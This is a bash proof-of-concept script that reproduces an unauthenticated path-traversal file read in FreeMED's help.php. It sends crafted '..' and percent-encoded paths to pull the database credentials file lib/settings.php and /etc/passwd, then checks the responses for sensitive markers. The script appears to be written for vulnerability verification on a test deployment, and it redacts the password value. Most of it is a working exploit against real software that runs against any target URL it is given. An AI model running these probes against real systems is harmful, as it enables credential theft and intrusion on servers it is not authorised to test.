#!/usr/bin/env bash
# Hostile repro: unauthenticated arbitrary file read via help.php
#
# help.php builds its output path as
#   dirname(__FILE__)."/ui/${ui}/help/${locale}/${path}"
# where $path is taken straight from PATH_INFO, so `..` sequences escape the
# help tree. Only $ui and $locale are sanitised.
#
# Usage:
#   BASE=http://localhost:38081 [DOCROOT=/usr/share/freemed] ./repro-help-traversal.sh
#
# Environment:
#   BASE     base URL of the FreeMED deployment (default http://localhost:38081)
#   DOCROOT  on-disk docroot of that deployment; printed for reference only
#            (default /usr/share/freemed)
#   TIMEOUT  per-request curl timeout in seconds (default 15)
#
# Exit codes:
#   0  all probes answered and nothing sensitive came back
#   1  EXPLOITED - at least one probe returned sensitive content
#   2  inconclusive - a probe got no response at all, so absence of evidence
#      proves nothing (a non-zero code, deliberately distinct from 1)
#
# Only `set -u` is used: every row must be attempted even when an earlier curl
# fails, and a failed curl must never abort the run.
set -u

BASE="${BASE:-http://localhost:38081}"
DOCROOT="${DOCROOT:-/usr/share/freemed}"
TIMEOUT="${TIMEOUT:-15}"

TMPDIR="${TMPDIR:-/tmp}"
OUT="$(mktemp "${TMPDIR%/}/freemed-help-traversal.XXXXXX" 2>/dev/null)" ||
  OUT="${TMPDIR%/}/freemed-help-traversal.$$"
cleanup() { rm -f "$OUT"; }
trap cleanup EXIT INT TERM HUP

# Depths are pre-verified: 4 `..` lands on $DOCROOT/lib/settings.php, 7+ `..`
# reaches /etc/passwd, and 8/9 `..` clamp at / because the kernel resolves the
# excess. The percent-encoded row covers a server/decoder that unescapes early.
PATHS=(
  "/gwt/en_US/main"                                            # control: legitimate help page
  "/gwt/en_US/../../../../lib/settings.php"                    # DB credentials
  "/gwt/en_US/../../../../../../../../etc/passwd"              # arbitrary absolute read
  "/gwt/en_US/../../../../../../../../../etc/passwd"           # extra .. clamps at /
  "/gwt/en_US/..%2f..%2f..%2f..%2flib/settings.php"            # encoded variant
)

# Sensitive markers. `^DB_PASSWORD` and `^root:.*:0:0:` are the required
# patterns; the trailing `DB_PASSWORD` alternative exists because a real
# lib/settings.php is generated from lib/settings.php.tpl and looks like
#   define ('DB_PASSWORD', "...");
# which the bare line anchor would miss.
SENSITIVE_RE='^DB_PASSWORD|^root:.*:0:0:|DB_PASSWORD'

printf 'repro: help.php unauthenticated path traversal\n'
printf 'base=%s  docroot=%s\n\n' "$BASE" "$DOCROOT"

exploited=0
unreachable=0
probes=0

for p in "${PATHS[@]}"; do
  probes=$((probes + 1))
  : >"$OUT"
  # -s keeps curl quiet, -w still prints 000 when the connection fails.
  code="$(curl -s --max-time "$TIMEOUT" -o "$OUT" -w '%{http_code}' "$BASE/help.php$p")"
  if [ -z "$code" ] || [ "$code" = "000" ]; then
    unreachable=$((unreachable + 1))
    printf '%-62s HTTP %s (no response: connection failed)\n' "$p" "000"
    continue
  fi

  first="$(head -c 80 "$OUT" | tr '\n\r' '  ')"
  printf '%-62s HTTP %s  %s\n' "$p" "$code" "$first"

  if grep -qE "$SENSITIVE_RE" "$OUT"; then
    exploited=$((exploited + 1))
    printf '  >>> EXPLOITED: sensitive content returned by %s\n' "$p"
    # Report which marker matched, not the secret itself: the credential value
    # is never echoed (and never written anywhere outside TMPDIR).
    if grep -qE 'DB_PASSWORD' "$OUT"; then
      printf '      | marker: DB_PASSWORD assignment present in body (value redacted)\n'
    fi
    if grep -qE '^root:.*:0:0:' "$OUT"; then
      printf '      | marker: /etc/passwd root entry present in body\n'
    fi
  fi
done

printf '\n%d probe(s) run, %d vulnerable response(s), %d unreachable\n' \
  "$probes" "$exploited" "$unreachable"

if [ "$exploited" -gt 0 ]; then
  printf '>>> RESULT: EXPLOITED - %d/%d traversal probe(s) returned sensitive content\n' \
    "$exploited" "$probes"
  exit 1
fi
if [ "$unreachable" -gt 0 ]; then
  printf '>>> RESULT: INCONCLUSIVE - %d/%d probe(s) got no response from %s\n' \
    "$unreachable" "$probes" "$BASE"
  exit 2
fi
printf '>>> RESULT: not vulnerable - no sensitive content returned by any probe\n'
exit 0
